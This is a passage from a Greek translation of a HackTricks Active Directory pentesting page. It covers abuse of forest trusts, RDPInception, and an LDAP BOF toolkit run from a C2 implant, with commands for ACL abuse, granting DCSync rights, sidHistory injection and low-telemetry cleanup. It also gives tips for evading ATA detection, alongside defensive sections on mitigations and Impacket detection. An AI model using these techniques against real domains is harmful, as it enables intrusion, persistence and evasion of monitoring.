Σε αυτό το σενάριο, **το domain σας είναι trusted** από ένα εξωτερικό domain, το οποίο σας παρέχει **μη καθορισμένα permissions** πάνω σε αυτό. Θα πρέπει να βρείτε **ποιοι principals του domain σας έχουν ποια πρόσβαση στο εξωτερικό domain** και στη συνέχεια να προσπαθήσετε να το εκμεταλλευτείτε:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Σε αυτό το σενάριο, **το domain σας** **εμπιστεύεται** ορισμένα **privileges** σε principal από **διαφορετικά domains**.

Ωστόσο, όταν ένα **domain είναι trusted** από το trusting domain, το trusted domain **δημιουργεί έναν user** με **προβλέψιμο όνομα**, ο οποίος χρησιμοποιεί ως **password το trusted password**. Αυτό σημαίνει ότι είναι δυνατή η **πρόσβαση σε έναν user από το trusting domain για είσοδο στο trusted domain**, ώστε να γίνει enumeration και να επιχειρηθεί περαιτέρω κλιμάκωση privileges:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Ένας άλλος τρόπος για να γίνει compromise στο trusted domain είναι να βρεθεί ένα [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) που έχει δημιουργηθεί προς την **αντίθετη κατεύθυνση** από αυτήν του domain trust, κάτι που δεν είναι ιδιαίτερα συνηθισμένο.

Ένας άλλος τρόπος για να γίνει compromise στο trusted domain είναι να περιμένει ο attacker σε ένα machine στο οποίο **μπορεί να αποκτήσει πρόσβαση ένας user από το trusted domain**, ώστε να κάνει login μέσω **RDP**. Στη συνέχεια, ο attacker θα μπορούσε να κάνει code injection στη διεργασία του RDP session και να **αποκτήσει πρόσβαση στο origin domain του victim** από εκεί.\
Επιπλέον, αν ο **victim είχε κάνει mount τον hard drive του**, ο attacker θα μπορούσε, μέσω της διεργασίας του **RDP session**, να αποθηκεύσει **backdoors** στο **startup folder του hard drive**. Αυτή η τεχνική ονομάζεται **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Μετριασμός του domain trust abuse

### **SID Filtering:**

- Ο κίνδυνος επιθέσεων που αξιοποιούν το attribute SID history σε forest trusts μετριάζεται μέσω του SID Filtering, το οποίο είναι ενεργοποιημένο από προεπιλογή σε όλα τα inter-forest trusts. Αυτό βασίζεται στην υπόθεση ότι τα intra-forest trusts είναι ασφαλή, καθώς θεωρείται ότι το forest, και όχι το domain, αποτελεί το security boundary, σύμφωνα με τη θέση της Microsoft.
- Ωστόσο, υπάρχει ένα μειονέκτημα: το SID filtering μπορεί να διαταράξει εφαρμογές και την πρόσβαση των users, με αποτέλεσμα να απενεργοποιείται περιστασιακά.

### **Selective Authentication:**

- Για inter-forest trusts, η χρήση του Selective Authentication διασφαλίζει ότι οι users από τα δύο forests δεν πραγματοποιούν αυτόματα authentication. Αντίθετα, απαιτούνται explicit permissions ώστε οι users να αποκτούν πρόσβαση σε domains και servers μέσα στο trusting domain ή forest.
- Είναι σημαντικό να σημειωθεί ότι αυτά τα μέτρα δεν προστατεύουν από την εκμετάλλευση του writable Configuration Naming Context (NC) ή από επιθέσεις στον trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## AD Abuse βασισμένο σε LDAP από On-Host Implants

Το [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) επανυλοποιεί LDAP primitives τύπου bloodyAD ως x64 Beacon Object Files, τα οποία εκτελούνται εξ ολοκλήρου μέσα σε ένα on-host implant (π.χ. Adaptix C2). Οι operators κάνουν compile το pack με `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, φορτώνουν το `ldap.axs` και στη συνέχεια καλούν `ldap <subcommand>` από το beacon. Όλη η κίνηση χρησιμοποιεί το τρέχον logon security context μέσω LDAP (389) με signing/sealing ή LDAPS (636) με automatic certificate trust, επομένως δεν απαιτούνται socks proxies ή disk artifacts.<sup>[[4]](#references)</sup>

### LDAP enumeration στην πλευρά του implant

- Τα `get-users`, `get-computers`, `get-groups`, `get-usergroups` και `get-groupmembers` μετατρέπουν σύντομα ονόματα/OU paths σε πλήρη DNs και κάνουν dump τα αντίστοιχα objects.
- Τα `get-object`, `get-attribute` και `get-domaininfo` αντλούν αυθαίρετα attributes, συμπεριλαμβανομένων των security descriptors, καθώς και τα forest/domain metadata από το `rootDSE`.
- Τα `get-uac`, `get-spn`, `get-delegation` και `get-rbcd` εμφανίζουν απευθείας από το LDAP τους roasting candidates, τις ρυθμίσεις delegation και τους υπάρχοντες descriptors του [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).
- Τα `get-acl` και `get-writable --detailed` κάνουν parse το DACL για να εμφανίσουν trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) και inheritance, παρέχοντας άμεσους στόχους για ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives για escalation & persistence

- Τα Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) επιτρέπουν στον operator να προετοιμάζει νέα principals ή machine accounts οπουδήποτε υπάρχουν δικαιώματα OU. Τα `add-groupmember`, `set-password`, `add-attribute` και `set-attribute` κάνουν άμεσα hijack στους στόχους μόλις εντοπιστούν δικαιώματα write-property.
- Εντολές που εστιάζουν στα ACL, όπως οι `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` και `add-dcsync`, μετατρέπουν τα WriteDACL/WriteOwner σε οποιοδήποτε AD object σε password resets, έλεγχο group membership ή DCSync replication privileges, χωρίς να αφήνουν artifacts από PowerShell/ADSI. Τα αντίστοιχα `remove-*` καθαρίζουν τα injected ACEs.

### Delegation, roasting και Kerberos abuse

- Τα `add-spn`/`set-spn` κάνουν άμεσα έναν compromised user Kerberoastable. Το `add-asreproastable` (UAC toggle) τον επισημαίνει για AS-REP roasting χωρίς να αγγίζει το password.
- Τα delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) επανεγγράφουν τα `msDS-AllowedToDelegateTo`, τα UAC flags ή το `msDS-AllowedToActOnBehalfOfOtherIdentity` από το beacon, ενεργοποιώντας constrained/unconstrained/RBCD attack paths και εξαλείφοντας την ανάγκη για remote PowerShell ή RSAT.

### Εισαγωγή sidHistory, μετακίνηση OU και διαμόρφωση attack surface

- Το `add-sidhistory` εισάγει privileged SIDs στο SID history ενός ελεγχόμενου principal (δείτε [SID-History Injection](sid-history-injection.md)), παρέχοντας stealthy access inheritance εξ ολοκλήρου μέσω LDAP/LDAPS.
- Το `move-object` αλλάζει το DN/OU υπολογιστών ή χρηστών, επιτρέποντας σε έναν attacker να μετακινήσει assets σε OUs όπου υπάρχουν ήδη delegated rights, πριν κάνει abuse των `set-password`, `add-groupmember` ή `add-spn`.
- Οι tightly scoped removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` κ.λπ.) επιτρέπουν γρήγορο rollback αφού ο operator συλλέξει credentials ή persistence, ελαχιστοποιώντας το telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Μερικές γενικές άμυνες

[**Μάθετε περισσότερα για την προστασία των credentials εδώ.**](../stealing-credentials/credentials-protections.md)

### **Αμυντικά μέτρα για την προστασία credentials**

- **Περιορισμοί Domain Admins**: Συνιστάται οι Domain Admins να επιτρέπεται να κάνουν login μόνο σε Domain Controllers, αποφεύγοντας τη χρήση τους σε άλλους hosts.
- **Privileges λογαριασμών υπηρεσίας**: Οι υπηρεσίες δεν πρέπει να εκτελούνται με Domain Admin (DA) privileges, ώστε να διατηρείται η ασφάλεια.
- **Χρονικός περιορισμός privileges**: Για εργασίες που απαιτούν DA privileges, η διάρκειά τους πρέπει να περιορίζεται. Αυτό μπορεί να επιτευχθεί με: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Μετριασμός LDAP relay**: Ελέγξτε τα Event IDs 2889/3074/3075 και, στη συνέχεια, επιβάλετε LDAP signing και LDAPS channel binding σε DCs/clients, ώστε να αποκλείσετε απόπειρες LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting σε επίπεδο protocol της δραστηριότητας του Impacket

Αν θέλετε να εντοπίσετε συνηθισμένο AD tradecraft, **μη βασίζεστε μόνο σε artifacts που ελέγχει ο operator**, όπως renamed binaries, service names, temp batch files ή output paths. Δημιουργήστε baseline για τον τρόπο με τον οποίο νόμιμοι Windows clients δημιουργούν [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC και WMI traffic, και στη συνέχεια αναζητήστε **implementation quirks** που παραμένουν ακόμη και αφού ο operator επεξεργαστεί τα `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` ή `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Standalone candidates υψηλής αξιοπιστίας** (αφού επικυρωθούν με βάση το δικό σας baseline):
- Authenticated DCE/RPC με `auth_context_id = 79231 + ctx_id`
- DCE/RPC authentication padding συμπληρωμένο με `0xff`
- LDAP Kerberos binds που τοποθετούν ένα raw Kerberos `AP-REQ` απευθείας στο SPNEGO `mechToken`
- SMB2/3 negotiate requests με τιμές `ClientGuid` που μοιάζουν με ASCII
- WMI `IWbemLevel1Login::NTLMLogin` που χρησιμοποιεί το non-standard namespace `//./root/cimv2`
- Hardcoded Kerberos nonce values
- **Καταλληλότερα ως correlation/scoring features**:
- Sparse ή duplicated Kerberos etype lists, ασυνήθιστα/missing `PA-DATA` ή TGS-REQ etype ordering που διαφέρει από το native Windows
- NTLM Type 1 messages χωρίς version info ή Type 3 messages με null host names
- Raw NTLMSSP μεταφερόμενο σε DCE/RPC αντί για SPNEGO, missing DCE/RPC verification trailers ή SPNEGO/Kerberos OID mismatches
- Πολλά από αυτά τα traits από τον ίδιο host/user/session/time window είναι πολύ ισχυρότερα από οποιοδήποτε μεμονωμένο weak field
- **Χρησιμοποιήστε τα ως enrichment, όχι ως standalone alerts**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names και tool-specific HTTP/WebDAV/RDP/MSSQL strings
- Αυτά είναι εύκολο να αλλάξουν από τους operators και χρησιμοποιούνται καλύτερα για να εξηγούν γιατί ένα cross-protocol cluster είναι ύποπτο
- **Operational notes**:
- Ορισμένα από αυτά τα signals απαιτούν decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW ή service-side visibility
- Επικυρώστε τα σε Samba/Linux clients, appliances και legacy software πριν τα μετατρέψετε σε alerts
- Προωθήστε τα detections από enrichment -> hunting -> alerting καθώς αυξάνετε την εμπιστοσύνη σας στο baseline

### **Υλοποίηση deception techniques**

- Η υλοποίηση deception περιλαμβάνει την τοποθέτηση traps, όπως decoy users ή computers, με χαρακτηριστικά όπως passwords που δεν λήγουν ή έχουν επισημανθεί ως Trusted for Delegation. Μια λεπτομερής προσέγγιση περιλαμβάνει τη δημιουργία χρηστών με συγκεκριμένα rights ή την προσθήκη τους σε high privilege groups.<sup>[[2]](#references)</sup>
- Ένα πρακτικό παράδειγμα περιλαμβάνει τη χρήση εργαλείων όπως: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Περισσότερες πληροφορίες για την ανάπτυξη deception techniques θα βρείτε στο [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Εντοπισμός deception**

- **Για User Objects**: Ύποπτες ενδείξεις περιλαμβάνουν atypical ObjectSID, infrequent logons, creation dates και low bad password counts.
- **Γενικές ενδείξεις**: Η σύγκριση των attributes πιθανών decoy objects με εκείνα γνήσιων objects μπορεί να αποκαλύψει inconsistencies. Εργαλεία όπως το [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) μπορούν να βοηθήσουν στον εντοπισμό τέτοιων deceptions.

### **Παράκαμψη detection systems**

- **Παράκαμψη Microsoft ATA Detection**:
- **User Enumeration**: Αποφύγετε το session enumeration σε Domain Controllers για να αποτρέψετε το ATA detection.
- **Ticket Impersonation**: Η χρήση **aes** keys για τη δημιουργία tickets βοηθά στην αποφυγή του detection, καθώς δεν γίνεται downgrade σε NTLM.
- **DCSync Attacks**: Συνιστάται η εκτέλεση από non-Domain Controller για την αποφυγή του ATA detection, καθώς η απευθείας εκτέλεση από Domain Controller θα ενεργοποιήσει alerts.

## References

- [1] [Ένας οδηγός για την επίθεση σε Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Παραποίηση Trusts για Deception στο Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Από Domain Admin σε Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Συλλογή LDAP BOF – In-Memory LDAP Toolkit για Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Ανάλυση του Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Ανάληψη Active Directory Accounts μέσω Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Πώς να διαχειριστείτε τις αλλαγές στις Netlogon secure channel connections που σχετίζονται με το CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Ένα ταξίδι σε ξεχασμένα Null Session και MS-RPC interfaces](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter ως security boundary μεταξύ domains; (Μέρος 4) - Έρευνα για bypass του SID filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter ως security boundary μεταξύ domains; (Μέρος 5) - Golden GMSA trust attack - από child σε parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter ως security boundary μεταξύ domains; (Μέρος 6) - Schema change trust attack - από child σε parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Από DA σε EA με ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Escalating from child domain's admins to enterprise admins in 5 minutes by abusing AD CS, a follow up](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [An ACE Up the Sleeve: Σχεδιασμός Active Directory DACL Backdoors](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
{{#include ../../banners/hacktricks-training.md}}
